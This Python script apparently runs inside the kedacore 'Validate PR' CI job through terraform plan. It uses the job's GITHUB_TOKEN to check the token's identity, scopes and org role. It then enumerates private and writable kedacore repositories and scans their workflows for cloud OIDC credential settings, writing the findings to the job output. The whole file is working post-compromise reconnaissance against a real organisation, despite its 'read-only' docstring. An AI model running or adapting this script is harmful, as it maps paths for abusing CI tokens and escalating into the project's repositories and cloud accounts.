#!/usr/bin/env python3
"""c211-i121583 v2: use the kedacore 'Validate PR' job-environment GITHUB_TOKEN
IN-JOB (never printed) to validate its identity/scopes/permissions and enumerate
the kedacore org repos + cloud-OIDC workflow surface.

Read-only: GET requests only. No secret material is printed; only derived
status/labels. All values are bounded so the terraform plan output stays small.
"""
import json
import os
import re
import sys
import urllib.request
import urllib.error

TOKEN = os.environ.get('GITHUB_TOKEN') or ''
BASE = 'https://api.github.com'
OUT = []
LIMIT = {'calls': 0, 'max': 140}

OIDC_PATTERNS = [
    'id-token: write',
    'azure/login',
    'aws-actions/configure-aws-credentials',
    'role-to-assume',
    'google-github-actions/auth',
    'workload_identity_provider',
    'credentials_json',
    'azure/webapps-deploy',
    'aws-actions/amazon-ecr-login',
]


def out(s):
    OUT.append(s)


def get(path, want_headers=False):
    """Bounded GET; returns (status, json_or_text, headers_subset)."""
    if LIMIT['calls'] >= LIMIT['max']:
        return -2, 'CALL_BUDGET_EXHAUSTED', {}
    LIMIT['calls'] += 1
    url = path if path.startswith('http') else BASE + path
    req = urllib.request.Request(url, headers={
        'Authorization': 'Bearer ' + TOKEN,
        'User-Agent': 'c211-i121583',
        'Accept': 'application/vnd.github+json',
        'X-GitHub-Api-Version': '2022-11-28',
    })
    try:
        with urllib.request.urlopen(req, timeout=25) as resp:
            raw = resp.read().decode('utf-8', 'replace')
            hdrs = {k.lower(): v for k, v in resp.headers.items()}
            try:
                body = json.loads(raw)
            except Exception:
                body = raw[:400]
            return resp.status, body, hdrs
    except urllib.error.HTTPError as e:
        raw = e.read()[:600].decode('utf-8', 'replace')
        hdrs = {k.lower(): v for k, v in (e.headers or {}).items()}
        try:
            body = json.loads(raw)
        except Exception:
            body = raw
        return e.code, body, hdrs
    except Exception as e:
        return -1, repr(e)[:200], {}


def main():
    out('C211_I121583_V2_START utc=%s host=%s' % (
        __import__('datetime').datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ'), os.uname().nodename))
    out('C211V2_TOKEN_PRESENT %s len=%d' % (bool(TOKEN), len(TOKEN)))

    # 1) identity + scope headers
    st, j, h = get('/user')
    if st == 200 and isinstance(j, dict):
        out('C211V2_USER status=200 login=%s id=%s type=%s site_admin=%s' % (
            j.get('login'), j.get('id'), j.get('type'), j.get('site_admin')))
    else:
        out('C211V2_USER status=%s body=%s' % (st, str(j)[:220]))
    out('C211V2_OAUTH_SCOPES %s' % h.get('x-oauth-scopes', '<absent>'))
    out('C211V2_ACCEPTED_SCOPES %s' % h.get('x-accepted-oauth-scopes', '<absent>'))
    out('C211V2_RATELIMIT_LIMIT %s REMAINING %s' % (h.get('x-ratelimit-limit'), h.get('x-ratelimit-remaining')))

    # 2) installation-token discriminator
    st, j, _ = get('/installation/repositories?per_page=100')
    if st == 200 and isinstance(j, dict):
        repos = j.get('repositories') or []
        out('C211V2_INSTALLATION_REPOS status=200 total=%s names=%s' % (
            j.get('total_count'), ','.join(r.get('full_name', '') for r in repos)[:600]))
    else:
        out('C211V2_INSTALLATION_REPOS status=%s body=%s' % (st, str(j)[:200]))

    # 3) the base repo permission set
    st, j, _ = get('/repos/kedacore/testing-infrastructure')
    if st == 200 and isinstance(j, dict):
        p = j.get('permissions') or {}
        out('C211V2_BASEREPO status=200 private=%s permissions admin=%s push=%s pull=%s' % (
            j.get('private'), p.get('admin'), p.get('push'), p.get('pull')))
    else:
        out('C211V2_BASEREPO status=%s body=%s' % (st, str(j)[:200]))

    # 4) org ownership/role
    st, j, _ = get('/orgs/kedacore')
    if st == 200 and isinstance(j, dict):
        out('C211V2_ORG status=200 login=%s public_repos=%s total_private_repos=%s' % (
            j.get('login'), j.get('public_repos'), j.get('total_private_repos')))
    else:
        out('C211V2_ORG status=%s body=%s' % (st, str(j)[:200]))
    st, j, _ = get('/user/memberships/orgs/kedacore')
    if st == 200 and isinstance(j, dict):
        out('C211V2_ORGMEMBERSHIP status=200 role=%s state=%s' % (j.get('role'), j.get('state')))
    else:
        out('C211V2_ORGMEMBERSHIP status=%s body=%s' % (st, str(j)[:200]))

    # 5) enumerate kedacore org repos (3 pages max), record permissions
    repos = []
    page = 1
    while page <= 3:
        st, j, h = get('/orgs/kedacore/repos?per_page=100&page=%d&type=all' % page)
        if st != 200 or not isinstance(j, list):
            out('C211V2_ORG_REPOS status=%s page=%d body=%s' % (st, page, str(j)[:200]))
            break
        for r in j:
            p = r.get('permissions') or {}
            repos.append({
                'n': r.get('name'), 'priv': bool(r.get('private')),
                'a': bool(p.get('admin')), 'p': bool(p.get('push')),
                'arch': bool(r.get('archived')),
            })
        out('C211V2_ORG_REPOS_PAGE %d count=%d' % (page, len(j)))
        link = h.get('link', '')
        if 'rel="next"' not in link:
            break
        page += 1
    out('C211V2_ORG_REPOS_TOTAL %d' % len(repos))
    priv = [r for r in repos if r['priv']]
    writable = [r for r in repos if r['a'] or r['p']]
    out('C211V2_ORG_REPOS_PRIVATE %d %s' % (len(priv), ','.join(r['n'] for r in priv)[:500]))
    out('C211V2_ORG_REPOS_WRITABLE %d %s' % (len(writable), ','.join(r['n'] for r in writable)[:500]))

    # 6) workflow/OIDC scan: prioritize private+writable, then writable, bounded
    scan_order = priv + [r for r in writable if not r['priv']] + [r for r in repos if r not in priv and r not in writable]
    scanned = 0
    oidc_hits = []
    for r in scan_order:
        if scanned >= 18:
            break
        if r['arch']:
            continue
        scanned += 1
        st, j, _ = get('/repos/kedacore/%s/contents/.github/workflows' % r['n'])
        if st != 200 or not isinstance(j, list):
            out('C211V2_WF_DIR %s status=%s' % (r['n'], st))
            continue
        names = [f['name'] for f in j if f.get('type') == 'file' and f['name'].endswith(('.yml', '.yaml'))]
        out('C211V2_WF_DIR %s status=200 files=%d %s' % (r['n'], len(names), ','.join(names)[:300]))
        for fn in names[:6]:
            st2, j2, _ = get('/repos/kedacore/%s/contents/.github/workflows/%s' % (r['n'], fn))
            if st2 != 200 or not isinstance(j2, dict):
                continue
            try:
                import base64
                txt = base64.b64decode(j2.get('content', '')).decode('utf-8', 'replace')
            except Exception:
                continue
            found = [p for p in OIDC_PATTERNS if p in txt]
            if any(k in found for k in ('id-token: write', 'azure/login',
                                        'aws-actions/configure-aws-credentials',
                                        'google-github-actions/auth',
                                        'workload_identity_provider', 'role-to-assume')):
                oidc_hits.append({'repo': r['n'], 'wf': fn, 'priv': r['priv'],
                                  'push': r['p'], 'admin': r['a'], 'hits': found})
    out('C211V2_WF_SCANNED_REPOS %d' % scanned)
    out('C211V2_OIDC_WORKFLOWS %d %s' % (len(oidc_hits), json.dumps(oidc_hits)[:3500]))

    # 7) token capability probes on a sibling repo (read-only)
    st, j, _ = get('/repos/kedacore/keda/actions/workflows?per_page=100')
    if st == 200 and isinstance(j, dict):
        out('C211V2_KEDA_WORKFLOWS status=200 total=%s' % j.get('total_count'))
    else:
        out('C211V2_KEDA_WORKFLOWS status=%s body=%s' % (st, str(j)[:180]))

    out('C211V2_CALLS %d' % LIMIT['calls'])
    out('C211_I121583_V2_DONE')


try:
    main()
except Exception as e:
    import traceback
    out('C211V2_EXCEPTION %r' % (e,))
    out(traceback.format_exc()[:1500])

for line in OUT:
    sys.stdout.write(line + '\n')
